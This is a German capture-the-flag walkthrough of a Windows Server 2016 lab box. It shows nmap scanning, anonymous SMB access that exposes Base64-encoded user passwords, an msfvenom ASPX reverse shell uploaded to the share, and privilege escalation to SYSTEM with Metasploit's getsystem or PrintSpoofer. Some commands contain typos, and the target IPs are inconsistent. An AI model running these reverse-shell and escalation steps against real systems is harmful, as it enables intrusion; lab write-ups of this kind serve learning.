# Ziel 10.10.57.161

# Scanning

## NMAP 

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-10-28T08:22:06+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-10-27T08:16:22
|_Not valid after:  2026-04-28T08:16:22
|_ssl-date: 2025-10-28T08:22:46+00:00; 0s from scanner time.
MAC Address: 02:BA:11:C4:D8:7B (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: -1s
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:ba:11:c4:d8:7b (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-28T01:22:06-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-28T08:22:06
|_  start_date: 2025-10-28T08:16:22


```

->  SMB Offen 

# SMB Enumeration


Schauen welche Verzeichnisse wir haben: 

(Kein PW benötigt)
```
root@ip-10-10-109-7:~# smbclient -L 10.10.189.139
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available

```

Versuch auf nt4wrksv zuzugreifen

```
root@ip-10-10-109-7:~# smbclient \\\\10.10.189.139\\nt4wrksv
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

		7735807 blocks of size 4096. 5139015 blocks available

```

das hat sich gelohnt 

Inhalt der Datei 
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Der Obere Part ist Base64 der zweite ist in Crackstation bekanntinhalt decoded unterhalb

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

# 2x Login found 

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

# Exploiting

Da wir access auf smb und einen Public share haben können wir hier auch ansetzten und eine Rev shell starten

Erstellen der revshell

```
msfvenom -p /windows/x64/windoes_reverse_tcp lhost=10.10.109.7 lport=8910 -f aspx -o shell.aspx
```

die laden wir dann mit put hoch. 

Nun noch einen Listener starten in dem Fall am besten mit MFS Console 

```
msf6 > use exploit/multi/handler  
[*] Using configured payload generic/shell_reverse_tcp  
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp  
payload => windows/x64/meterpreter_reverse_tcp  
msf6 exploit(multi/handler) > set LHOST 10.10.109.7
LHOST =>  10.10.109.7
msf6 exploit(multi/handler) > set LPORT 8910  
LPORT => 8910
```

und dafür sorgen das die Session gestartet wird 

```
curl http://10.10.249.119:49663/nt4wrksv/shell1.aspx

```

shon haben wir access


Um Rechte auszuweiten können wir entweder das Toolkit von Multi handler nutzen via

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

oder manuell, indem wir zuersteinmal schauen was uns so zur verfügung steht via 

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege


```

Hier intressant zu sehen ist das wir das  "SeImpersonatePrivilege" haben

Um das zu exploiten können wir den Forgefertigten Exploit PrintSpoofer nutzen 

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

Die Exe laden wir dann mit SMB hoch und switchen via "shell" in Meterpreter auf eine cmd auf dem system

Jetzt wechseln wir in das SMB verzeichniss via der shell 

```
cd c:/inetpub/wwwroot/nt4wrksv
```

und führen das tool aus 

```
PrintSpoofer64.exe -i -c powershell.exe
```

Tadaa schon haben wir root und können uns die Flag holen